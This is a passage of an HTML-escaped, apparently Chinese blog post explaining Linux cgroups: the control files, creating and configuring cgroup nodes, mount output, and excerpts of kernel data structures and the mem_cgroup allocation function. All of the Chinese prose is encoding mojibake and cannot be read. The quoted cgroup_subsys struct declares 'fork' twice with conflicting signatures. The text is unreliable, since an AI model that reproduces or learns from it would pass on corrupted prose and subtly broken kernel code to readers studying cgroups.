&lt;p&gt;åœ¨cgroupæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œåˆ›å»º(åˆ é™¤)ä¸€ä¸ªç›®å½•å°±æ˜¯åˆ›å»º(åˆ é™¤)ä¸€ä¸ªcgroupï¼Œåˆ›å»ºå®Œç›®å½•åï¼Œä¼šè‡ªåŠ¨äº§ç”Ÿå¾ˆå¤šæ–‡ä»¶ï¼Œåœ¨cgroupæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ä¸‹(åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­æ˜¯&lt;code&gt;/sys/fs/cgroup/cpu&lt;/code&gt;)çš„å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šå‡ºç°åœ¨cgroupæ–‡ä»¶ç³»ç»Ÿçš„ä¸‹çº§ç›®å½•ä¸­ï¼Œé™¤äº†å°‘æ•°åœ¨ä»£ç å®ç°ä¸­æ ‡è®°ä¸ºåªåœ¨æ ¹ç›®å½•ä¸­å‡ºç°çš„æ–‡ä»¶ï¼Œä¾‹å¦‚&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å„ä¸ªå­ç³»ç»Ÿçš„é€šç”¨æ–‡ä»¶ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;cgroup.procs&lt;/code&gt;&lt;br&gt;
æ­¤æ–‡ä»¶çš„å†…å®¹å’Œcgroupä¸­æ‰€æœ‰è¿›ç¨‹çš„è¿›ç¨‹å·å…³è”ã€‚è¿™é‡Œçš„è¿›ç¨‹å·å®é™…ä¸Šæ˜¯çº¿ç¨‹ç»„å·(thread group ID)ã€‚å‘è¿™ä¸ªæ–‡ä»¶å†™å…¥ä¸€ä¸ªçº¿ç¨‹ç»„å·ï¼Œå°±ä¼šæŠŠæ•´ä¸ªçº¿ç¨‹ç»„ä¸­çš„çº¿ç¨‹éƒ½åŠ å…¥æ­¤æ–‡ä»¶æ‰€å±çš„cgroupã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.clone_chidren&lt;/code&gt;&lt;br&gt;
è¿™ä¸ªæ–‡ä»¶å’Œä¸€ä¸ªæ ‡å¿—å…³è”ï¼Œè€Œæ­¤æ ‡å¿—åªè¢«&lt;code&gt;cpuset&lt;/code&gt;å­ç³»ç»Ÿä½¿ç”¨ã€‚å½“æ­¤æ ‡å¿—ä¸º1æ—¶ï¼Œåˆ›å»ºæ–°çš„æœ‰å…³&lt;code&gt;cpuset&lt;/code&gt;çš„cgroupæ—¶ï¼Œå­cgroupä»çˆ¶cgroupä¸­å¤åˆ¶&lt;code&gt;cpuset&lt;/code&gt;é…ç½®ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;&lt;br&gt;
æ˜¾ç¤ºcgroupæ–‡ä»¶ç³»ç»Ÿçš„&lt;code&gt;sane_behavior&lt;/code&gt;çš„çŠ¶æ€ã€‚éšç€å†…æ ¸æ§åˆ¶ç»„å­ç³»ç»Ÿçš„å¼€å‘ï¼Œä¸€äº›æ—§çš„åšæ³•ä¸å†åˆé€‚ï¼Œä½†æ˜¯ä¸ºäº†å…¼å®¹æ—§çš„åº”ç”¨åˆä¸å¥½å®Œå…¨æ¸…é™¤ã€‚äºæ˜¯å¼€å‘è€…æä¾›äº†ä¸€ä¸ªé€‰é¡¹&lt;code&gt;__DEVEL__sane_behavior&lt;/code&gt;ï¼Œä¾›æŒ‚è½½æ—¶ä½¿ç”¨ã€‚å¦‚æœæœ‰è¿™ä¸ªæŒ‚è½½é€‰é¡¹ï¼Œè€æ—§çš„ä¸åˆé€‚çš„ä»£ç é€»è¾‘å°±ä¸ä¼šå‡ºç°ï¼Œ&lt;code&gt;tasksã€notify_on_releaseã€release_agent&lt;/code&gt; è¿™ä¸‰ä¸ªæ–‡ä»¶ä¹Ÿä¸ä¼šå‡ºç°ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tasks&lt;/code&gt;&lt;br&gt;
æ—§æœºåˆ¶ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ã€‚æ­¤æ–‡ä»¶å…³è”æ§åˆ¶ç»„ä¸­æ‰€æœ‰çº¿ç¨‹çš„çº¿ç¨‹å·ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;notify_on_release&lt;/code&gt;&lt;br&gt;
æ—§æœºåˆ¶ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ã€‚é€šè¿‡å®ƒæ¥å­˜å– &lt;code&gt;notify_on_release&lt;/code&gt; æ ‡å¿—ã€‚å½“æ­¤æ ‡å¿—ä¸º 1 æ—¶ï¼Œåœ¨ cgroupé€€å‡ºæ—¶ï¼Œå†…æ ¸è¦é€šçŸ¥ç”¨æˆ·æ€ã€‚æ‰€è°“é€€å‡ºæ˜¯æŒ‡æ­¤ cgroup ä¸å†æœ‰è¿›ç¨‹ï¼Œä¹Ÿä¸å†æœ‰å­ cgroupã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;release_agent&lt;/code&gt;&lt;br&gt;
æ—§æœºåˆ¶ï¼Œå°½é‡ä¸è¦ä½¿ç”¨ã€‚æ­¤æ–‡ä»¶ä¸­å­˜æœ‰ä¸€ä¸ªè·¯å¾„ï¼Œå½“å†…æ ¸éœ€è¦é€šçŸ¥ç”¨æˆ·æ€ cgroup é€€å‡ºäº‹ä»¶æ—¶ï¼Œå†…æ ¸è¿è¡Œæ­¤è·¯å¾„æ‰€æŒ‡çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å­èŠ‚ç‚¹å’Œè¿›ç¨‹&#34;&gt;å­èŠ‚ç‚¹å’Œè¿›ç¨‹&lt;/h3&gt;
&lt;p&gt;æŒ‚è½½æŸä¸€ä¸ªcgroupå­ç³»ç»Ÿåˆ°æŒ‚è½½ç‚¹ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡åœ¨æŒ‚è½½ç‚¹ä¸‹é¢å»ºç«‹æ–‡ä»¶å¤¹åˆ›å»ºcgroupå±‚çº§ç»“æ„ä¸­çš„èŠ‚ç‚¹ï¼Œå½“åˆ›å»ºå®Œæ–‡ä»¶å¤¹åï¼Œä¼šè‡ªåŠ¨åœ¨å…¶ä¸­åˆ›å»ºç›¸å…³çš„é…ç½®æ–‡ä»¶ã€‚åˆ›å»ºç›®å½•çš„åŠ¨ä½œä¹Ÿå°±æ˜¯åˆ›å»ºäº†ä¸‹ä¸ªå±‚çº§çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œè¿˜å¯ä»¥åœ¨è¿™ä¸ªç›®å½•ä¸­ç»§ç»­åˆ›å»ºç›®å½•ï¼Œå½¢æˆç¬¬ä¸‰å±‚çº§ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨ç›¸åº”çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šå…·ä½“çš„é…ç½®ã€‚ä¾‹å¦‚åœ¨&lt;code&gt;cpu.shares&lt;/code&gt;ä¸­å†™å…¥æ•´æ•°å€¼å¯ä»¥æ§åˆ¶è¯¥cgroupè·å¾—çš„æ—¶é—´ç‰‡ã€‚&lt;/p&gt;
&lt;p&gt;åˆ›å»ºå¹¶é…ç½®å®ŒèŠ‚ç‚¹åï¼Œå°†è¿›ç¨‹çš„pidå†™å…¥å­èŠ‚ç‚¹ä¸‹é¢çš„taskæ–‡ä»¶ä¸­å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# åœ¨cpuå±‚çº§åˆ›å»ºä¸€ä¸ªæ–°çš„cgroupèŠ‚ç‚¹
# å‘½åä¸ºcpu_c1
mkdir /cgroup/cpu/cpu_c1

# è®¾ç½®`cpu.shares`æ–‡ä»¶
# å°†cpu_c1ç›®å½•ä¸‹çš„cpu.sharesæ–‡ä»¶å€¼è®¾ä¸º2048ï¼Œè¿™æ ·åœ¨ç³»ç»Ÿå‡ºç°cpuäº‰æŠ¢æ—¶
# å±äºcpu_c1è¿™ä¸ªcgroupçš„è¿›ç¨‹å ç”¨èµ„æºæ˜¯å…¶å®ƒè¿›ç¨‹çš„2å€ã€‚
echo 2048 &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/cpu.shares

# å°†è¿›ç¨‹åŠ å…¥åˆ°`cpu_c1`è¿™ä¸ªcgroupèŠ‚ç‚¹ã€‚
echo pid &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥çœ‹å·²ç»æŒ‚è½½çš„cgroup&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;mount -t cgroup
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,xattr,release_agent=/usr/lib/systemd/systemd-cgroup-agent,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuacct,cpu)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,blkio)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,net_prio,net_cls)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,perf_event)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,freezer)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,hugetlb)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuset)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,memory)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æºç åˆ†æ&#34;&gt;æºç åˆ†æ&lt;/h2&gt;
&lt;p&gt;cgroupåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æè¿°å­ç³»ç»Ÿ(subsys)å’Œcgroupç­‰å¯¹è±¡ã€å’Œå®ƒä»¬çš„ä¾é™„å…³ç³»ç­‰æ•°æ®ç»“æ„ï¼›&lt;/li&gt;
&lt;li&gt;æä¾›ç»™ç”¨æˆ·ç©ºé—´çš„æ–‡ä»¶ç³»ç»Ÿæ¥å£ï¼›&lt;/li&gt;
&lt;li&gt;å„å­ç³»ç»Ÿã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æ•°æ®ç»“æ„&#34;&gt;æ•°æ®ç»“æ„&lt;/h3&gt;
&lt;h4 id=&#34;ä»»åŠ¡task&#34;&gt;ä»»åŠ¡(task)&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;task&lt;/code&gt;å¯¹åº”linuxä¸­çš„è¿›ç¨‹ï¼Œ&lt;code&gt;task&lt;/code&gt;å’Œ&lt;code&gt;cgroup&lt;/code&gt;ä¹‹é—´æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ï¼Œ&lt;code&gt;cgroup&lt;/code&gt;å’Œ&lt;code&gt;subsys&lt;/code&gt;æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œ&lt;code&gt;task&lt;/code&gt;å’Œ&lt;code&gt;subsys&lt;/code&gt;ä¹Ÿæ˜¯å¤šå¯¹å¤šçš„å…³ç³»(&lt;code&gt;task&lt;/code&gt;å¯ä»¥ä¾é™„å¤šä¸ª&lt;code&gt;cgroup&lt;/code&gt;ï¼Œä¸€ä¸ª&lt;code&gt;cgroup&lt;/code&gt;å¯èƒ½ä¾é™„äº†å¤šä¸ª&lt;code&gt;subsys&lt;/code&gt;)ã€‚&lt;/p&gt;
&lt;p&gt;è¦æè¿°è¿™äº›å…³ç³»ä¸å®¹æ˜“ï¼Œå¦‚æœ&lt;code&gt;task&lt;/code&gt;é€šè¿‡å„&lt;code&gt;cgroup&lt;/code&gt;æ¥å¼•ç”¨å„&lt;code&gt;subsys&lt;/code&gt;å†ä»&lt;code&gt;subsys&lt;/code&gt;è·å–åˆ°èµ„æºé™åˆ¶ï¼Œè¿™æ¯”è¾ƒä½æ•ˆã€‚ä½†æ˜¯ä»&lt;code&gt;task&lt;/code&gt;è§†è§’æ¥çœ‹ï¼Œæ¯ä¸ª&lt;code&gt;task&lt;/code&gt;å—åˆ°å„ä¸ªå­ç³»ç»Ÿçš„é™åˆ¶çš„æ˜¯ä¸€å®šçš„ï¼Œ&lt;strong&gt;å†…æ ¸ç”¨&lt;code&gt;css_set&lt;/code&gt;æ¥æè¿°å¤šä¸ª&lt;code&gt;subsys&lt;/code&gt;çš„ç»„åˆï¼Œ&lt;code&gt;task&lt;/code&gt;é€šè¿‡&lt;code&gt;css_set&lt;/code&gt;çŸ¥é“å®ƒå—å“ªäº›é™åˆ¶&lt;/strong&gt;ï¼ŒåŠ å¿«äº†è®¿é—®é€Ÿåº¦ï¼Œè€Œä¸”&lt;code&gt;subsys&lt;/code&gt;ç»„åˆæ˜¯æœ‰é™çš„ï¼Œå‡å°‘äº†å†…æ ¸æ•°æ®ç»“æ„çš„å¤æ‚åº¦ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;css_set&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;çœ‹&lt;code&gt;css_set&lt;/code&gt;ç»“æ„ä½“ï¼Œ&lt;code&gt;css_set&lt;/code&gt;è¡¨ç¤ºä¸€ç§èµ„æºé™åˆ¶çš„é›†åˆ(æ¯”å¦‚&lt;code&gt;cpu 20% mem 40%&lt;/code&gt;å’Œ&lt;code&gt;cpu 30% mem 20%&lt;/code&gt;æ˜¯ä¸åŒçš„èµ„æºé™åˆ¶ï¼Œç”¨ä¸åŒçš„css_set)å¹¶ä¸”è¿æ¥è¿›ç¨‹å’Œsubsysã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct css_set { 
â€¦ 
    // å¼•ç”¨æ­¤css_setçš„è¿›ç¨‹é“¾è¡¨
    struct list_head tasks;
    // å…³è”çš„cgroupé“¾è¡¨ï¼Œé€šè¿‡cg_cgroup_linkç»“æ„ä½“æ¥è¿æ¥
    struct list_head cgrp_links; 
    // cg_linksç”¨äºé“¾æ¥æ‰€æœ‰å…³äºæ­¤css_setçš„cgroupï¼Œcgroupå¹¶ä¸æ˜¯ç›´æ¥è¿æ¥åˆ°æ­¤list_headï¼Œè€Œæ˜¯é€šè¿‡cg_cgroup_linkç»“æ„ä½“è¿æ¥ã€‚

    //ç”¨äºå¼•ç”¨åˆ°css_seté‡Œå…·ä½“çš„subsys,æ¯ä¸ªsubsysåœ¨è¿™é‡Œéƒ½æœ‰ä¸ªå…ƒç´ ï¼Œ
    struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];
â€¦ 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;è¿›ç¨‹ç»“æ„ä½“&lt;code&gt;task_struct&lt;/code&gt;ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/sched.h 
struct task_struct { 
â€¦ 
#ifdef CONFIG_cgroup 
    // è¯¥è¿›ç¨‹å…³è”çš„css_set
    struct css_set __rcu *cgroup; 
    // é“¾æ¥åˆ°å…³è”æ­¤css_setçš„taské“¾è¡¨
    struct list_head cg_list; 
#endif 
â€¦ 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;taskå¯ä»¥é€šè¿‡task_struct-&amp;gt;css_set-&amp;gt;subsys-&amp;gt;cgroupæ‰¾åˆ°è¯¥taskæ‰€ä¾é™„çš„cgroupã€‚&lt;/p&gt;
&lt;h3 id=&#34;cgroup&#34;&gt;cgroup&lt;/h3&gt;
&lt;p&gt;åœ¨ç»“æ„ä½“&lt;code&gt;cgroup&lt;/code&gt;ä¸­ï¼Œä¸€ä¸ª&lt;code&gt;cgroup&lt;/code&gt;å®ä¾‹å°±æ˜¯cgroupæ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªcgroupæ–‡ä»¶ï¼Œ&lt;code&gt;cgroup&lt;/code&gt;ç»“æ„ä½“ä¸»è¦ä½œç”¨æ˜¯å…³è”&lt;code&gt;css_set&lt;/code&gt;å’Œ&lt;code&gt;subsys&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äº&lt;code&gt;task&lt;/code&gt;åˆ°&lt;code&gt;cgroup&lt;/code&gt;ä¸éœ€è¦ç›´æ¥è¿æ¥ï¼Œå¯ä»¥é€šè¿‡&lt;code&gt;css_set&lt;/code&gt;å¼•ç”¨åˆ°&lt;code&gt;cgroup&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
// å­èŠ‚ç‚¹cgroup
struct cgroup { 
    â€¦ 
    struct list_head sibling;         /* my parent&#39;s children */ 
    struct list_head children;        /* my children */ 
    struct cgroup *parent;            /* my parent */ 

    struct list_head files;           /* my files */ 
    struct dentry *dentry;            /* cgroup fs entry, RCU protected */ 
    struct cgroupfs_root *root;  // æŒ‡å‘hierarchyç»“æ„ä½“ï¼Œæ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿéƒ½æœ‰ä¸€ä¸ªcgroupfs_rootï¼Œåœ¨mountæ—¶åˆ›å»º

    struct cgroup_subsys_state __rcu *subsys[CGROUP_SUBSYS_COUNT]; 

    struct list_head cset_links; 
    â€¦ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤§è‡´å¯ä»¥åˆ†ä¸º4éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cgroupå±‚çº§ç»“æ„ï¼ŒåŒ…æ‹¬&lt;code&gt;sibling children parent&lt;/code&gt;ä¸‰ä¸ªæˆå‘˜ï¼›&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å‡è®¾å­˜åœ¨è¿™æ ·ä¸€æ£µæ ‘ï¼Œæ ¹èŠ‚ç‚¹æœ‰ä¸¤ä¸ªå„¿å­ï¼Œç¬¬ä¸€ä¸ªå„¿å­åˆæœ‰ä¸¤ä¸ªå„¿å­ã€‚é‚£ä¹ˆcgroupå±‚çº§ç»“æ„å…³ç³»å¦‚å›¾ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621992084807.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;cgroupå’Œæ–‡ä»¶ç³»ç»Ÿçš„å…³ç³»ï¼ŒåŒ…æ‹¬&lt;code&gt;files dentry root&lt;/code&gt;ä¸‰ä¸ªæˆå‘˜ï¼›&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å†…æ ¸cgroupå­ç³»ç»Ÿåˆ›é€ äº†åä¸ºcgroupçš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚æ¯ä¸ªcgroupèŠ‚ç‚¹éƒ½å’Œæ­¤æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç›®å½•ç›¸è”ç³»ã€‚&lt;/p&gt;
&lt;p&gt;ç»“æ„ä½“ä¸­æˆå‘˜&lt;code&gt;dentry *dentry&lt;/code&gt;æŒ‡å‘ä¸ä¹‹ç›¸å…³è”çš„ç›®å½•ï¼Œæˆå‘˜&lt;code&gt;list_head files&lt;/code&gt;æŒ‡å‘ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæˆå‘˜&lt;code&gt;cgroupfs_root*root&lt;/code&gt;æŒ‡å‘cgroupæ–‡ä»¶ç³»ç»Ÿçš„æ ¹èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªcgroupå®ä¾‹æ˜¯å±äºä¸€ä¸ªå±‚çº§çš„ï¼Œè€Œä¸€ä¸ªå±‚çº§æœ‰ä¸“é—¨çš„ç»“æ„ä½“æè¿°ï¼Œå¦‚åŒæ–‡ä»¶ç³»ç»Ÿæœ‰ä¸ª&lt;code&gt;super_block&lt;/code&gt;è¶…çº§å—ä¸€æ ·ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct cgroupfs_root { 
â€¦ 
    struct super_block *sb;  // è¿™ä¸ªå±‚çº§ç›¸å…³è”çš„æ–‡ä»¶ç³»ç»Ÿçš„super_block
    unsigned long subsys_mask;  // è¡¨ç¤ºè¿™ä¸ªcgroupæ–‡ä»¶ç³»ç»ŸæŒ‚è½½ä¸­åŒ…å«çš„å­ç³»ç»Ÿ
    struct cgroup top_cgroup; // æ ¹ç›®å½•æ‰€å…³è”çš„cgroup
    int number_of_cgroup;  // è¡¨ç¤ºæ­¤å±‚çº§ä¸­åŒ…å«çš„cgroupçš„æ•°é‡
â€¦ 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ§åˆ¶ç»„å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç³»ç»Ÿï¼Œåä¸º&lt;code&gt;cgroup&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// kernel/cgroup.c 
static struct file_system_type cgroup_fs_type = { 
    .name = &amp;quot;cgroup&amp;quot;, 
    .mount = cgroup_mount, 
    .kill_sb = cgroup_kill_sb, 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;mount -t cgroup cgroup -o cpu /sys/fs/cgroup/cpu
mount -t cgroup cgroup -o memory /sys/fs/cgroup/memory
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤æ¡å‘½ä»¤æŒ‚è½½äº†ä¸¤ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿï¼Œä¸€ä¸ªä½¿ç”¨CPUå­ç³»ç»Ÿï¼Œä¸€ä¸ªä½¿ç”¨memoryå­ç³»ç»Ÿã€å†…æ ¸ä¸­çš„æ•°æ®ç»“æ„å¦‚å›¾ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621993025657.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;cgroupå­ç³»ç»Ÿï¼Œæˆå‘˜ä¸º&lt;code&gt;subsys&lt;/code&gt;ï¼›&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é¦–å…ˆå…ˆçœ‹&lt;code&gt;cgroup_subsys&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;æè¿°ä¸€ä¸ªsubsysï¼Œå†…æ ¸ä¸­çš„subsysåœ¨ä»£ç é‡Œå®šä¹‰å¥½äº†ï¼Œä¸å­˜åœ¨åŠ¨æ€æ·»åŠ subsysã€‚æ‰€æœ‰subsyså­˜åœ¨æ•°ç»„&lt;code&gt;subsys&lt;/code&gt;ä¸­ï¼Œå…¶æ•°ç»„å…ƒç´ å£°æ˜åœ¨linux/cgroup_subsys.hä¸­ï¼Œè€Œå®é™…æ¯ä¸ªå…ƒç´ æ˜¯å®šä¹‰åœ¨å„ä¸ªå­ç³»ç»Ÿçš„æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚mem_cgroupçš„å­ç³»ç»Ÿmem_cgroup_subsysæ˜¯å®šä¹‰åœ¨mm\memcontrol.cä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;...
static struct cgroup_subsys *subsys[CGROUP_SUBSYS_COUNT] = {
#include &amp;lt;linux/cgroup_subsys.h&amp;gt;
};

struct cgroup_subsys {
    struct cgroup_subsys_state *(*css_alloc)(struct cgroup_subsys_state *parent_css);
    int (*css_online)(struct cgroup_subsys_state *css);
    void (*css_offline)(struct cgroup_subsys_state *css);
    void (*css_free)(struct cgroup_subsys_state *css);
    int (*css_attach)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*cancel_attach)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*attach)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*fork)(struct cgroup_subsys_state *css, struct cgroup_taskset *tset);
    void (*fork)(struct task_struct *task); 
    void (*exit)(struct cgroup_subsys_state *css, struct cgroup_subsys_state 
    *old_css, struct task_struct *task); 
    void (*bind)(struct cgroup_subsys_state *root_css); 
    â€¦ 
    struct list_head cftsets; 
    struct cftype *base_cftypes; 
    struct cftype_set base_cftset; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ¯ä¸ªsubsysæœ‰è‡ªå·±çš„å±æ€§å’Œæ“ä½œï¼Œç”¨ç›¸åŒçš„ç»“æ„ä½“æ¥æè¿°subysæœ‰ç‚¹å¤ªå›°éš¾äº†ï¼Œcgroup_subsysæè¿°çš„æ˜¯subsysé€šç”¨çš„éƒ¨åˆ†ï¼Œå„ç§ä¸åŒçš„subsys(å¦‚mem_cgroupï¼Œcpuç­‰)æ˜¯æœ‰è‡ªå·±çš„ç»“æ„ä½“çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;çš„å­—æ®µä¸»è¦å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å›è°ƒå‡½æ•°æŒ‡é’ˆå˜é‡ï¼›&lt;/li&gt;
&lt;li&gt;ç”¨äº&lt;code&gt;cgroup_subsys&lt;/code&gt;ç»„ç»‡ç»“æ„ï¼›&lt;/li&gt;
&lt;li&gt;ä¸€éƒ¨åˆ†å’Œcftypeç›¸å…³ï¼Œæ¯ä¸ªcgroupç›®å½•ä¸‹éƒ½æœ‰ä¸€äº›subsysçš„æ–‡ä»¶ç”¨äºè®¾ç½®subsysçš„å±æ€§ï¼Œè¿™äº›å±æ€§æ˜¯cftypeæè¿°çš„ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;å›è°ƒå‡½æ•°&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å›è°ƒå‡½æ•°ä¸­&lt;code&gt;css_alloc&lt;/code&gt;å€¼å¾—å…³æ³¨ï¼Œè¯¥å‡½æ•°åˆ›å»ºå…·ä½“subsysçš„ç»“æ„ä½“å¹¶è¿”å›ä¸€ä¸ª&lt;code&gt;cgroup_subsys_state&lt;/code&gt;ï¼Œè¯¥ç»“æ„ä½“çš„æŒ‡é’ˆæ˜¯css_set-&amp;gt;subsysæ•°ç»„çš„å…ƒç´ ã€‚mem_cgroup_subsysçš„css_allocå‡½æ•°mem_cgroup_css_allocã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct cgroup_subsys_state * __ref
mem_cgroup_css_alloc(struct cgroup *cont)
{
	struct mem_cgroup *memcg;
	long error = -ENOMEM;
	int node;

	memcg = mem_cgroup_alloc();
	if (!memcg)
		return ERR_PTR(error);

	for_each_node(node)
		if (alloc_mem_cgroup_per_zone_info(memcg, node))
			goto free_out;

	/* root ? */
	if (cont-&amp;gt;parent == NULL) {
		root_mem_cgroup = memcg;
		page_counter_init(&amp;amp;memcg-&amp;gt;memory, NULL);
		memcg-&amp;gt;soft_limit = PAGE_COUNTER_MAX;
		page_counter_init(&amp;amp;memcg-&amp;gt;memsw, NULL);
		page_counter_init(&amp;amp;memcg-&amp;gt;kmem, NULL);
	}

	memcg-&amp;gt;last_scanned_node = MAX_NUMNODES;
	INIT_LIST_HEAD(&amp;amp;memcg-&amp;gt;oom_notify);
	atomic_set(&amp;amp;memcg-&amp;gt;refcnt, 1);
	memcg-&amp;gt;move_charge_at_immigrate = 0;
	mutex_init(&amp;amp;memcg-&amp;gt;thresholds_lock);
	spin_lock_init(&amp;amp;memcg-&amp;gt;move_lock);
	vmpressure_init(&amp;amp;memcg-&amp;gt;vmpressure);

	return &amp;amp;memcg-&amp;gt;css;

free_out:
	__mem_cgroup_free(memcg);
	return ERR_PTR(error);
}

struct mem_cgroup {
	struct cgroup_subsys_state css;
	...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ç»„ç»‡ç»“æ„&lt;/strong&gt;&lt;/p&gt;
